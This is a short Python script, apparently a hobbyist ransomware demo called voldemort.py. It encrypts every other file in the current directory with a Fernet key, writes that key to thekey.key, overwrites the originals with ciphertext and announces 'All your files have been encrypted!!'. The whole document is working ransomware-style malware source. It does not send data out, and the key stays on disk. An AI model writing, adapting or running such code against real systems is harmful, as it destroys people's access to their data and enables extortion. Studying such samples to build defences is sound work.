import os 
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" :
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate a random key to encrypt the files
key = Fernet.generate_key()        

with open("thekey.key", "wb") as thekey:
    thekey.write(key)


for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()    
    content_encrypted = Fernet(key).encrypt(contents)    
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

print("All your files have been encrypted!!")        